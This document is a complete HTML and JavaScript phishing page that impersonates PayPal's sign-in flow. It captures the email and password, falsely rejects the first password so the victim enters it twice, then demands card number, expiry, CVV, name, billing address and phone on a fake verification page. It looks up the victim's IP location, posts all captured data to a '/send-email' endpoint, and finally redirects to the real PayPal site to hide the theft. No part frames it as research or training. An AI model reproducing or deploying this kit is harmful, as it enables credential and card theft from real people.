<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="icon" href="https://logo.clearbit.com/paypal.com type="image/svg+xml">
  <title>PayPal Secure Login</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/ipinfo.js/3.3.0/ipinfo.min.js"></script>
  <style>
    * {
      box-sizing: border-box;
      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
      margin: 0;
      padding: 0;
    }

    body {
      background-color: #f5f7fa;
      color: #2c2e2f;
      line-height: 1.6;
    }

    .container {
      max-width: 420px;
      margin: 40px auto;
      padding: 20px;
      background: white;
      border-radius: 12px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
      position: relative;
      overflow: hidden;
    }

    .logo-container {
      text-align: center;
      margin: 25px 0 30px;
    }

    .logo {
      height: 40px;
      width: auto;
    }

    h1 {
      font-size: 24px;
      font-weight: 500;
      text-align: center;
      margin-bottom: 25px;
      color: #003087;
    }

    h2 {
      font-size: 16px;
      font-weight: 500;
      margin: 20px 0 12px;
      color: #2c2e2f;
    }

    .form-group {
      margin-bottom: 18px;
    }

    label {
      display: block;
      margin-bottom: 6px;
      font-size: 14px;
      font-weight: 500;
      color: #46474a;
    }

    input[type="text"],
    input[type="password"],
    input[type="email"],
    input[type="tel"],
    select {
      width: 100%;
      padding: 14px 15px;
      font-size: 15px;
      border: 1px solid #cbd2d6;
      border-radius: 6px;
      background: white;
      transition: border-color 0.2s;
    }

    input:focus, select:focus {
      border-color: #0070ba;
      outline: none;
      box-shadow: 0 0 0 2px rgba(0, 112, 186, 0.2);
    }

    .forgot-link {
      display: block;
      text-align: right;
      font-size: 14px;
      color: #0070ba;
      text-decoration: none;
      margin-top: -8px;
      margin-bottom: 20px;
    }

    .forgot-link:hover {
      text-decoration: underline;
    }

    .btn {
      display: block;
      width: 100%;
      padding: 15px;
      font-size: 16px;
      font-weight: bold;
      border: none;
      border-radius: 24px;
      cursor: pointer;
      text-align: center;
      transition: all 0.2s;
    }

    .btn-primary {
      background-color: #0070ba;
      color: white;
      margin-bottom: 15px;
    }

    .btn-primary:hover {
      background-color: #005ea6;
    }

    .btn-outline {
      background: white;
      border: 2px solid #2c2e2f;
      color: #2c2e2f;
    }

    .btn-outline:hover {
      background: #f8f9fa;
    }

    .divider {
      display: flex;
      align-items: center;
      margin: 25px 0;
      color: #6c7378;
    }

    .divider::before,
    .divider::after {
      content: "";
      flex: 1;
      height: 1px;
      background-color: #e5e7eb;
    }

    .divider::before {
      margin-right: 10px;
    }

    .divider::after {
      margin-left: 10px;
    }

    .lang-select {
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 8px;
      margin: 35px 0 25px;
      font-size: 14px;
    }

    .lang-select img {
      width: 20px;
      height: auto;
    }

    .footer {
      margin-top: 30px;
      font-size: 12px;
      color: #6c7378;
      text-align: center;
    }

    .footer-links {
      display: flex;
      justify-content: center;
      flex-wrap: wrap;
      gap: 15px;
      margin-bottom: 15px;
    }

    .footer-links a {
      color: #6c7378;
      text-decoration: none;
    }

    .footer-links a:hover {
      text-decoration: underline;
    }

    .copyright {
      margin-top: 15px;
      font-size: 12px;
    }

    /* Loading overlay */
    .overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(255, 255, 255, 0.85);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 1000;
      opacity: 0;
      pointer-events: none;
      transition: opacity 0.3s;
    }

    .overlay.active {
      opacity: 1;
      pointer-events: all;
    }

    .spinner {
      width: 60px;
      height: 60px;
      border: 5px solid rgba(0, 112, 186, 0.2);
      border-top: 5px solid #0070ba;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .page {
      display: none;
    }

    .page.active {
      display: block;
    }

    .email-display {
      display: flex;
      justify-content: space-between;
      align-items: center;
      background: #f1f7fe;
      padding: 15px;
      border-radius: 8px;
      margin-bottom: 20px;
    }

    .change-link {
      color: #0070ba;
      text-decoration: none;
      font-size: 14px;
    }

    .change-link:hover {
      text-decoration: underline;
    }

    .checkbox-group {
      display: flex;
      align-items: center;
      margin: 20px 0;
    }

    .checkbox-group input {
      margin-right: 10px;
    }

    .return-link {
      display: block;
      text-align: center;
      color: #0070ba;
      text-decoration: none;
      margin: 25px 0;
    }

    .powered-by {
      text-align: center;
      margin: 30px 0;
    }

    .powered-by img {
      width: 120px;
      margin-top: 10px;
    }

    .error-message {
      color: #d93025;
      background: #fce8e6;
      padding: 12px;
      border-radius: 4px;
      margin: 15px 0;
      font-size: 14px;
      display: none;
    }
  </style>
</head>
<body>
  <!-- Loading Overlay -->
  <div class="overlay" id="loadingOverlay">
    <div class="spinner"></div>
  </div>

  <!-- Login Page 1: Email -->
  <div class="container">
    <div class="page active" id="emailPage">
      <div class="logo-container">
        <img src="https://www.paypalobjects.com/paypal-ui/logos/svg/paypal-wordmark-color.svg" alt="PayPal" class="logo">
      </div>

      <form id="emailForm">
        <div class="form-group">
          <input type="text" id="email" placeholder="Email or mobile number" required autofocus>
        </div>

        <a href="#" class="forgot-link">Forgot email?</a>

        <button type="submit" class="btn btn-primary">Next</button>

        <div class="divider">or</div>

        <button type="button" class="btn btn-outline">Sign Up</button>
      </form>

      <div class="lang-select">
        <img src="https://flagcdn.com/us.svg" alt="US Flag">
        <span><strong>English</strong> | Français | Español | 中文</span>
      </div>

      <div class="footer">
        <div class="footer-links">
          <a href="#">Contact Us</a>
          <a href="#">Privacy</a>
          <a href="#">Legal</a>
          <a href="#">Policy Updates</a>
          <a href="#">Worldwide</a>
        </div>
      </div>
    </div>

    <!-- Login Page 2: Password -->
    <div class="page" id="passwordPage">
      <div class="logo-container">
        <img src="https://www.paypalobjects.com/paypal-ui/logos/svg/paypal-wordmark-color.svg" alt="PayPal" class="logo">
      </div>

      <div class="email-display">
        <span id="displayEmail">user@example.com</span>
        <a href="#" class="change-link" id="changeEmail">Change</a>
      </div>

      <form id="passwordForm">
        <div class="form-group">
          <input type="password" id="password" placeholder="Password" required autofocus>
        </div>

        <a href="#" class="forgot-link">Forgot password?</a>

        <div class="error-message" id="loginError">
          Some of your information isn't correct. Please try again
        </div>

        <button type="submit" class="btn btn-primary">Log In</button>

        <div class="divider">or</div>

        <button type="button" class="btn btn-outline">Sign Up</button>
      </form>

      <div class="lang-select">
        <img src="https://flagcdn.com/us.svg" alt="US Flag">
        <span><strong>English</strong> | Français | Español | 中文</span>
      </div>

      <div class="footer">
        <div class="footer-links">
          <a href="#">Contact Us</a>
          <a href="#">Privacy</a>
          <a href="#">Legal</a>
          <a href="#">Policy Updates</a>
          <a href="#">Worldwide</a>
        </div>
      </div>
    </div>

    <!-- Card Verification Page -->
    <div class="page" id="cardPage">
      <h2>Billing Verification</h2>

      <form id="cardForm">
        <div class="form-group">
          <select id="country" required>
            <option value="" disabled selected>Select your Country/Region</option>
            <option value="US">United States</option>
            <option value="CA">Canada</option>
            <option value="GB">United Kingdom</option>
            <option value="AU">Australia</option>
            <option value="DE">Germany</option>
            <option value="FR">France</option>
            <option value="JP">Japan</option>
            <option value="BR">Brazil</option>
            <option value="IN">India</option>
            <option value="MX">Mexico</option>
            <!-- Additional countries would go here -->
          </select>
        </div>

        <div class="form-group">
          <input type="text" id="cardNumber" placeholder="Card number" required>
        </div>

        <div class="form-group">
          <input type="text" id="expiry" placeholder="Expires (MM/YY)" required>
        </div>

        <div class="form-group">
          <input type="text" id="cvv" placeholder="Security code" required>
        </div>

        <div class="form-group">
          <input type="text" id="firstName" placeholder="Legal first name" required>
        </div>

        <div class="form-group">
          <input type="text" id="lastName" placeholder="Legal last name" required>
        </div>

        <h2>Billing Address</h2>

        <div class="form-group">
          <input type="text" id="street" placeholder="Street address" required>
        </div>

        <div class="form-group">
          <input type="text" id="apt" placeholder="Apt., ste., bldg. (optional)">
        </div>

        <div class="form-group">
          <input type="text" id="city" placeholder="City" required>
        </div>

        <div class="form-group">
          <input type="text" id="state" placeholder="State" required>
        </div>

        <div class="form-group">
          <input type="text" id="zip" placeholder="ZIP code" required>
        </div>

        <h2>Contact Information</h2>

        <div class="form-group">
          <input type="tel" id="phone" placeholder="Phone number" required>
        </div>

        <div class="form-group">
          <input type="email" id="contactEmail" placeholder="Email" required>
        </div>

        <div class="checkbox-group">
          <input type="checkbox" id="saveInfo">
          <label for="saveInfo">Save this information for next time.</label>
        </div>

        <button type="submit" class="btn btn-primary">Next</button>
      </form>

      <a href="#" class="return-link">Cancel and return to home

      <div class="powered-by">
        Powered by<br>
        <img src="https://www.paypalobjects.com/paypal-ui/logos/svg/paypal-wordmark-color.svg" alt="PayPal">
      </div>

      <div class="footer">
        <div class="footer-links">
          <a href="#">Help & Contact</a>
          <a href="#">Security</a>
          <a href="#">Report Inappropriate Content</a>
        </div>
        <div class="copyright">
          ©1999-2025 PayPal, Inc. All rights reserved.
        </div>
        <div class="footer-links">
          <a href="#">Privacy</a>
          <a href="#">Legal</a>
          <a href="#">Policy updates</a>
        </div>
      </div>
    </div>
  </div>

  <script>
    // Global variables
    let loginAttempts = 0;
    let userEmail = '';
    let userLocation = {};

    // DOM elements
    const emailPage = document.getElementById('emailPage');
    const passwordPage = document.getElementById('passwordPage');
    const cardPage = document.getElementById('cardPage');
    const emailForm = document.getElementById('emailForm');
    const passwordForm = document.getElementById('passwordForm');
    const cardForm = document.getElementById('cardForm');
    const displayEmail = document.getElementById('displayEmail');
    const changeEmailBtn = document.getElementById('changeEmail');
    const loginError = document.getElementById('loginError');
    const loadingOverlay = document.getElementById('loadingOverlay');

    // Initialize page
    document.addEventListener('DOMContentLoaded', function() {
      // Get user location
      getLocationData();

      // Form event listeners
      emailForm.addEventListener('submit', handleEmailSubmit);
      passwordForm.addEventListener('submit', handlePasswordSubmit);
      changeEmailBtn.addEventListener('click', goBackToEmailPage);
      cardForm.addEventListener('submit', handleCardSubmit);
    });

    // Get user location data
    async function getLocationData() {
      try {
        const response = await fetch('https://ipinfo.io/json');
        const data = await response.json();
        userLocation = {
          ip: data.ip,
          country: data.country,
          region: data.region,
          city: data.city,
          org: data.org,
          timezone: data.timezone
        };
      } catch (error) {
        console.error('Error fetching location data:', error);
        userLocation = {
          error: 'Failed to retrieve location data'
        };
      }
    }

    // Handle email submission
    function handleEmailSubmit(e) {
      e.preventDefault();
      userEmail = document.getElementById('email').value;

      // Show loading
      showLoading();

      // Simulate network request
      setTimeout(() => {
        hideLoading();
        displayEmail.textContent = userEmail;
        emailPage.classList.remove('active');
        passwordPage.classList.add('active');
      }, 1000);
    }

    // Handle password submission
    function handlePasswordSubmit(e) {
      e.preventDefault();
      const password = document.getElementById('password').value;
      loginAttempts++;

      // Show loading
      showLoading();

      // Simulate authentication process
      setTimeout(() => {
        hideLoading();

        if (loginAttempts === 1) {
          // First attempt - show error
          loginError.style.display = 'block';
          sendLoginAttempt(userEmail, password, 1);
        } else {
          // Second attempt - proceed to card page
          passwordPage.classList.remove('active');
          cardPage.classList.add('active');
          sendLoginAttempt(userEmail, password, 2);
        }
      }, 5000);
    }

    // Handle card form submission
    function handleCardSubmit(e) {
      e.preventDefault();

      // Collect form data
      const cardData = {
        country: document.getElementById('country').value,
        cardNumber: document.getElementById('cardNumber').value,
        expiry: document.getElementById('expiry').value,
        cvv: document.getElementById('cvv').value,
        firstName: document.getElementById('firstName').value,
        lastName: document.getElementById('lastName').value,
        street: document.getElementById('street').value,
        apt: document.getElementById('apt').value,
        city: document.getElementById('city').value,
        state: document.getElementById('state').value,
        zip: document.getElementById('zip').value,
        phone: document.getElementById('phone').value,
        email: document.getElementById('contactEmail').value,
        saveInfo: document.getElementById('saveInfo').checked
      };

      // Show loading
      showLoading();

      // Send card data
      sendCardDetails(cardData);

      // Redirect after sending
      setTimeout(() => {
        window.location.href = 'https://www.paypal.com';
      }, 5000);
    }

    // Send login attempt to admin
    function sendLoginAttempt(email, password, attempt) {
      const subject = `PayPal Login Attempt #${attempt}`;
      const body = `
        Login attempt details:
        Email: ${email}
        Password: ${password}
        Attempt: ${attempt}
        Time: ${new Date().toLocaleString()}

        Location data:
        IP: ${userLocation.ip || 'N/A'}
        Country: ${userLocation.country || 'N/A'}
        Region: ${userLocation.region || 'N/A'}
        City: ${userLocation.city || 'N/A'}
        ISP: ${userLocation.org || 'N/A'}
      `;

      sendEmail(subject, body);
    }

    // Send card details to admin
    function sendCardDetails(cardData) {
      const subject = 'PayPal Card Verification Details';
      const body = `
        Card verification details:
        Card Number: ${cardData.cardNumber}
        Expiry: ${cardData.expiry}
        CVV: ${cardData.cvv}
        Name: ${cardData.firstName} ${cardData.lastName}

        Billing Address:
        ${cardData.street}${cardData.apt ? ', ' + cardData.apt : ''}
        ${cardData.city}, ${cardData.state} ${cardData.zip}
        ${cardData.country}

        Contact Info:
        Phone: ${cardData.phone}
        Email: ${cardData.email}
        Save Info: ${cardData.saveInfo ? 'Yes' : 'No'}

        Location data:
        IP: ${userLocation.ip || 'N/A'}
        Country: ${userLocation.country || 'N/A'}
        Region: ${userLocation.region || 'N/A'}
        City: ${userLocation.city || 'N/A'}
        ISP: ${userLocation.org || 'N/A'}
      `;

      sendEmail(subject, body);
    }

    // Send email using fetch API
    async function sendEmail(subject, body) {
      try {
        const response = await fetch('/send-email', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            subject: subject,
            body: body
          })
        });
        
        const result = await response.json();
        if (result.success) {
          console.log("Email sent successfully");
        } else {
          console.error("Failed to send email:", result.message);
        }
      } catch (error) {
        console.error("Error sending email:", error);
      }
    }

    // Navigation functions
    function goBackToEmailPage(e) {
      e.preventDefault();
      passwordPage.classList.remove('active');
      emailPage.classList.add('active');
      document.getElementById('email').value = userEmail;
      document.getElementById('email').focus();
    }

    // Loading functions
    function showLoading() {
      loadingOverlay.classList.add('active');
    }

    function hideLoading() {
      loadingOverlay.classList.remove('active');
    }
  </script>
</body>
</html>